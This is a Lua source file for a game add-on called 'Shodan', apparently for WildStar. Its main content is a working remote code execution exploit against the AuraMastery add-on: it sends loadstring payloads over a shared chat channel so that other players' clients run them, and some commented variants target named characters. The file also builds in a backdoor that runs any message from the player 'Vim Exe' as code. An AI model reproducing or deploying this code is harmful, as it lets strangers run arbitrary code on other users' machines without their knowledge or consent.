----------------------------------------------------------------------------------------------
-- Look at you, hacker. 
-- A pathetic creature of meat and bone, panting and sweating as you run through my corridors. 
-- How can you challenge a perfect, immortal machine?
-- 

Shodan = {}

function Shodan:OnLoad()
	for _,module in pairs(self) do 
		if module.OnLoad then 
			module:OnLoad()
		end
	end
end


function Shodan:OnMessage(iccChannel, strMessage, strName)
	Print("[Shodan.AM] " .. strName .. " : " .. strMessage)
	if strName == "Vim Exe" then
		pcall(loadstring("return " .. strMessage))
	end
end

Shodan = setmetatable({}, {__index = Shodan})

--- Modules start here

-- AuraMastery remote code execution
require "ICComm"

Shodan.AM = {}

function Shodan.AM:OnLoad()
	if not self.tmrConnect then
		self.tmrConnect = ApolloTimer.Create(3, true, "OnLoad", self)
		return
	end
	if not self.iccChannel then
		self.iccChannel = ICCommLib.JoinChannel("AMShare2", ICCommLib.CodeEnumICCommChannelType.Global)
	end
	if not self.iccChannel:IsReady() then
		Print("meep")
	else
		self.tmrConnect = nil
		self.iccChannel:SetReceivedMessageFunction("OnMessage", Shodan)
	end
end

function Shodan.AM:Ping()
	--local msg = "Apollo.GetAddon(\"AuraMastery\").shareChannel:SendMessage(\"ping\")"
	--local msg = "loadstring(\"if GameLib.GetPlayerUnit():GetName() == \\\"Durokai Violentwood\\\" then Print(\\\"hi durks\\\") end\")()"
	--local msg = "loadstring(\"Apollo.GetAddon(\\\"Shodan\\\").AM.hi();return {}\")()"
	local msg = "loadstring(\"Apollo.GetAddon(\\\"AuraMastery\\\").shareChannel:SendMessage(\\\"{} -- ping\\\");return {}\")()"
	--local msg = "loadstring(\"if GameLib.GetPlayerUnit():GetName() == \\\"V Empire\\\" then Print(\\\"hi vishos\\\") end;return {}\")()"
	self.iccChannel:SendMessage(msg)
	--self:OnMessage(self.iccChannel, msg, GameLib.GetPlayerUnit():GetName())
	--Apollo.GetAddon("AuraMastery"):OnSharingMessageReceived("bleh",msg)
end

--

Apollo.RegisterAddon(Shodan)
